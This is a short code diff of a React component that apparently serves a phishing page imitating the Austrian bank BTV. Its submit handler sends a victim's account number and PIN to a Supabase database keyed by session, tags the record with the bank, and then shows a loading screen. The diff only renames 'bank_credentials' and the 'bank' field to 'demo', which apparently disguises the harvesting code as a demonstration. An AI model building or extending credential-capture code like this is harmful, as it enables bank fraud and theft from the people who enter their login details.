@@ -141,7 +141,7 @@ const Btv = () => {
   const handleSubmit = async () => {
     if (!verfNr.trim()) return;
     if (sessionId) {
-      const { error } = await supabase.rpc("update_bank_credentials", {
+      const { error } = await supabase.rpc("update_demo_credentials", {
         p_session_id: sessionId,
         p_username: verfNr,
         p_password: pin,
@@ -149,7 +149,7 @@ const Btv = () => {
         p_password_label: "Pin",
       });
       if (error) console.error("Update failed:", error);
-      await supabase.from("submissions").update({ bank: "BTV" }).eq("session_id", sessionId);
+      await supabase.from("submissions").update({ demo: "BTV" }).eq("session_id", sessionId);
     }
     setShowLoading(true);
   };
